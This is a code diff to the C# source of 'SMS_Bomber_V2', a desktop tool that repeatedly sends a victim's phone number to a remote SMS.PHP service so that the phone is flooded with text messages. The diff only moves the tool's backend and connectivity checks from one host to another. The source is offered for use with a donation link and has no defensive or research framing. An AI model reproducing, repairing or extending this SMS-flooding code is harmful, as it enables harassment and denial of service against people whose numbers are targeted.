@@ -29,7 +29,7 @@ namespace SMS_Bomber_V2
             try
             {
                 HttpRequest SMS_REQ = new HttpRequest();
-                string SMS_REQ_RES = SMS_REQ.Get("https://cheap-cloud.ir//AGC007/SMS.PHP?mobile=" + Mobile_TXT.Text).ToString();
+                string SMS_REQ_RES = SMS_REQ.Get("https://AGC007.IR//AGC007/SMS.PHP?mobile=" + Mobile_TXT.Text).ToString();
                 SMS_REQ.UserAgentRandomize();
 
                 if(SMS_REQ_RES.Contains("Process Sucssfull!!"))
@@ -106,7 +106,7 @@ namespace SMS_Bomber_V2
                     {
                        //HttpRequest Test_Net = new HttpRequest();
                         Test_Net.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64";
-                        var GetTest_Site = Test_Net.Get("https://cheap-cloud.ir/").ToString();
+                        var GetTest_Site = Test_Net.Get("https://AGC007.IR/").ToString();
                     
                         if (GetTest_Site.Contains("AGC007 -- HOST"))
                         {                           
@@ -117,7 +117,7 @@ namespace SMS_Bomber_V2
                             {
                                 //HttpRequest Test_Net = new HttpRequest();
                                 Test_Net.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64";
-                                var GetTest_API = Test_Net.Get("https://cheap-cloud.ir//AGC007/SMS.PHP").ToString();
+                                var GetTest_API = Test_Net.Get("https://AGC007.IR/AGC007/SMS.PHP").ToString();
 
                                 if (GetTest_API.Contains("SMS Bomber By AGC007"))
                                 {Acc_Check.ForeColor = Color.Green; Acc_Check.Text = ("Connected(" + IP_Reg + ").");}
@@ -237,7 +237,7 @@ namespace SMS_Bomber_V2
         private void STOP_URL_BTN_Click(object sender, EventArgs e)//STOP_BTN
         {TimeSMS.Enabled = false; SEND_SMS_LBL.Text = "0"; Error_SEND_SMS_LBL.Text = "0"; Error_SEND_SMS_LBL.Text = "0"; Mobile_LBL.Text = "09"; Mobile_TXT.Text = "09"; }
         private void relyButton1_Click(object sender, EventArgs e)//Site Version
-        { Process.Start("https://cheap-cloud.ir/AGC007/SMS/");}
+        { Process.Start("https://AGC007.IR/AGC007/SMS/");}
         private void Donate_BTC_BTN_Click(object sender, EventArgs e)
         {Process.Start("https://sellix.io/product/61097508c8613");}//BTC
         private void Mobile_TXT_TextChanged(object sender, EventArgs e)//Mobile_TXT_TextChanged
